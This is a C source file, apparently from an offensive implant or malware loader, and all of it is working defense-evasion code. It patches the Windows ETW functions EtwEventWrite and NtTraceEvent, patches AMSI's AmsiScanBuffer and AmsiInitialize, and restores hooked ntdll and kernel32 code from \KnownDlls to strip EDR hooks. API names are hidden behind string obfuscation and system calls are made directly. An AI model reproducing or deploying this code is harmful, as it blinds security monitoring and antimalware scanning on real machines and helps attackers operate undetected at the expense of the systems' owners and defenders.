/**
 * patches.c - ETW/AMSI/Unhook evasion
 */
#include <windows.h>
#include "../../include/config.h"
#include "../../include/obfuscate.h"
#include "../../include/evasion.h"
#include "../../include/syscalls.h"

static const BYTE PATCH_RET_ZERO[] = { 0x48, 0x33, 0xC0, 0xC3 };

static BYTE g_etw_original[4];
static BYTE g_amsi_scan_original[6];
static PVOID g_etw_address = NULL;
static PVOID g_amsi_scan_address = NULL;

#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x00000040L
#endif

#ifndef SECTION_MAP_READ
#define SECTION_MAP_READ 0x0004
#endif

#ifndef ViewShare
#define ViewShare 1
#endif

typedef struct _JAGER_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} JAGER_UNICODE_STRING;

typedef struct _JAGER_OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    JAGER_UNICODE_STRING *ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} JAGER_OBJECT_ATTRIBUTES;

static void jager_init_object_attributes(
    JAGER_OBJECT_ATTRIBUTES *oa, JAGER_UNICODE_STRING *name, ULONG attrs)
{
    oa->Length = sizeof(JAGER_OBJECT_ATTRIBUTES);
    oa->RootDirectory = NULL;
    oa->ObjectName = name;
    oa->Attributes = attrs;
    oa->SecurityDescriptor = NULL;
    oa->SecurityQualityOfService = NULL;
}

static void jager_init_unicode_string(JAGER_UNICODE_STRING *us, PCWSTR ws) {
    us->Buffer = (PWSTR)ws;
    us->Length = (USHORT)(lstrlenW(ws) * sizeof(WCHAR));
    us->MaximumLength = us->Length + sizeof(WCHAR);
}

static BOOL apply_patch(PVOID target, const BYTE *patch, SIZE_T patch_size, BYTE *original) {
    ULONG old;

    if (!target) return FALSE;
    if (original) {
        for (SIZE_T i = 0; i < patch_size; i++)
            original[i] = ((PBYTE)target)[i];
    }
    if (!jager_protect_memory(GetCurrentProcess(), target, patch_size, PAGE_READWRITE, &old))
        return FALSE;
    for (SIZE_T i = 0; i < patch_size; i++)
        ((PBYTE)target)[i] = patch[i];
    jager_protect_memory(GetCurrentProcess(), target, patch_size, old, &old);
    return TRUE;
}

static BOOL restore_patch(PVOID target, const BYTE *original, SIZE_T size) {
    ULONG old;

    if (!target) return FALSE;
    if (!jager_protect_memory(GetCurrentProcess(), target, size, PAGE_READWRITE, &old))
        return FALSE;
    for (SIZE_T i = 0; i < size; i++)
        ((PBYTE)target)[i] = original[i];
    jager_protect_memory(GetCurrentProcess(), target, size, old, &old);
    return TRUE;
}

static BOOL copy_text_section(PVOID hooked_base, PVOID clean_base) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hooked_base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)hooked_base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            PVOID target = (PVOID)((BYTE *)hooked_base + sec[i].VirtualAddress);
            PVOID source = (PVOID)((BYTE *)clean_base + sec[i].VirtualAddress);
            DWORD size = sec[i].Misc.VirtualSize;
            ULONG old;
            if (!jager_protect_memory(GetCurrentProcess(), target, size,
                                     PAGE_EXECUTE_READWRITE, &old))
                return FALSE;
            CopyMemory(target, source, size);
            jager_protect_memory(GetCurrentProcess(), target, size, old, &old);
            return TRUE;
        }
    }
    return FALSE;
}

static BOOL patch_etw_bytes(void) {
    HMODULE ntdll = GetModuleHandleA(OBF("ntdll.dll"));
    if (!ntdll) return FALSE;
    g_etw_address = (PVOID)GetProcAddress(ntdll, OBF("EtwEventWrite"));
    if (!g_etw_address) return FALSE;
    return apply_patch(g_etw_address, PATCH_RET_ZERO, sizeof(PATCH_RET_ZERO), g_etw_original);
}

static BOOL patch_etw_nttrace_bytes(void) {
    HMODULE ntdll = GetModuleHandleA(OBF("ntdll.dll"));
    if (!ntdll) return FALSE;
    PVOID addr = (PVOID)GetProcAddress(ntdll, OBF("NtTraceEvent"));
    if (!addr) return FALSE;
    return apply_patch(addr, PATCH_RET_ZERO, sizeof(PATCH_RET_ZERO), NULL);
}

static BOOL patch_amsi_bytes(void) {
    HMODULE hAmsi = LoadLibraryA(OBF("amsi.dll"));
    if (!hAmsi) return TRUE;
    g_amsi_scan_address = (PVOID)GetProcAddress(hAmsi, OBF("AmsiScanBuffer"));
    if (!g_amsi_scan_address) return FALSE;
    static const BYTE amsi_patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    return apply_patch(g_amsi_scan_address, amsi_patch, sizeof(amsi_patch), g_amsi_scan_original);
}

static BOOL try_patchless_bypass(void) {
#if AMSI_BYPASS_METHOD == BYPASS_METHOD_HWBP
    return hwbp_install_bypass();
#elif AMSI_BYPASS_METHOD == BYPASS_METHOD_PAGEGUARD
    return pageguard_install_bypass();
#else
    return FALSE;
#endif
}

BOOL unhook_module(const wchar_t *dll_name) {
    if (!dll_name)
        return FALSE;

    wchar_t section_path[128];
    lstrcpyW(section_path, L"\\KnownDlls\\");
    lstrcatW(section_path, dll_name);

    JAGER_UNICODE_STRING us;
    jager_init_unicode_string(&us, section_path);
    JAGER_OBJECT_ATTRIBUTES oa;
    jager_init_object_attributes(&oa, &us, OBJ_CASE_INSENSITIVE);

    HANDLE hSection = NULL;
    NTSTATUS st = sys_NtOpenSection(&hSection, SECTION_MAP_READ, &oa);
    if (st != STATUS_SUCCESS || !hSection)
        return FALSE;

    PVOID clean_view = NULL;
    SIZE_T view_size = 0;
    st = sys_NtMapViewOfSection(hSection, GetCurrentProcess(), &clean_view, 0, 0,
                                NULL, &view_size, ViewShare, 0, PAGE_READONLY);
    if (st != STATUS_SUCCESS || !clean_view) {
        CloseHandle(hSection);
        return FALSE;
    }

    wchar_t narrow_name[64];
    lstrcpynW(narrow_name, dll_name, 64);
    char ansi_name[64];
    WideCharToMultiByte(CP_ACP, 0, narrow_name, -1, ansi_name, sizeof(ansi_name), NULL, NULL);

    PVOID hooked_base = GetModuleHandleA(ansi_name);
    if (!hooked_base) {
        sys_NtUnmapViewOfSection(GetCurrentProcess(), clean_view);
        CloseHandle(hSection);
        return FALSE;
    }

    BOOL ok = copy_text_section(hooked_base, clean_view);
    sys_NtUnmapViewOfSection(GetCurrentProcess(), clean_view);
    CloseHandle(hSection);
    return ok;
}

BOOL patch_etw(void) {
    BOOL ok;

    if (g_etw_bypassed) {
        bypass_etw_ti_targeted();
        return TRUE;
    }
    if (try_patchless_bypass())
        ok = TRUE;
    else
        ok = patch_etw_bytes();
    bypass_etw_ti_targeted();
    return ok;
}

BOOL patch_etw_nttrace(void) {
#if AMSI_BYPASS_METHOD != BYPASS_METHOD_PATCH
    if (g_etw_bypassed || try_patchless_bypass())
        return TRUE;
#endif
    return patch_etw_nttrace_bytes();
}

BOOL etw_patch_nttrace(void) {
    return patch_etw_nttrace();
}

BOOL etw_patch(void) {
    return patch_etw();
}

BOOL etw_restore(void) {
#if AMSI_BYPASS_METHOD != BYPASS_METHOD_PATCH
    bypass_remove();
#endif
    return restore_patch(g_etw_address, g_etw_original, sizeof(g_etw_original));
}

BOOL patch_amsi(void) {
    if (g_amsi_bypassed)
        return TRUE;
    if (try_patchless_bypass())
        return TRUE;
    return patch_amsi_bytes();
}

BOOL amsi_patch(void) {
    return patch_amsi();
}

BOOL amsi_patch_init(void) {
#if AMSI_BYPASS_METHOD != BYPASS_METHOD_PATCH
    if (g_amsi_bypassed || try_patchless_bypass())
        return TRUE;
#endif
    HMODULE hAmsi = LoadLibraryA(OBF("amsi.dll"));
    if (!hAmsi) return TRUE;
    PVOID addr = (PVOID)GetProcAddress(hAmsi, OBF("AmsiInitialize"));
    if (!addr) return FALSE;
    return apply_patch(addr, PATCH_RET_ZERO, sizeof(PATCH_RET_ZERO), NULL);
}

BOOL evasion_patch_all(void) {
    BOOL ok = TRUE;
    if (!patch_etw()) ok = FALSE;
    patch_etw_nttrace();
    bypass_etw_ti_targeted();
    if (!patch_amsi()) ok = FALSE;
    amsi_patch_init();
    install_dll_load_monitor();
    return ok;
}

void evasion_restore_temporarily(void) {
#if AMSI_BYPASS_METHOD == BYPASS_METHOD_PATCH
    if (g_etw_address)
        restore_patch(g_etw_address, g_etw_original, sizeof(g_etw_original));
#else
    bypass_remove();
#endif
}

void evasion_repatch(void) {
#if AMSI_BYPASS_METHOD == BYPASS_METHOD_PATCH
    if (g_etw_address)
        apply_patch(g_etw_address, PATCH_RET_ZERO, sizeof(PATCH_RET_ZERO), NULL);
#else
    bypass_install();
#endif
}

BOOL unhook_ntdll(void) {
    return unhook_dll(OBF("ntdll.dll"));
}

BOOL unhook_dll(const char *dll_name) {
    if (!dll_name)
        return FALSE;
    wchar_t wname[64];
    MultiByteToWideChar(CP_ACP, 0, dll_name, -1, wname, 64);
    return unhook_module(wname);
}

BOOL unhook_all_known_dlls(void) {
    BOOL ok = unhook_dll(OBF("ntdll.dll"));
    if (!unhook_dll(OBF("kernel32.dll")))
        ok = FALSE;
    return ok;
}
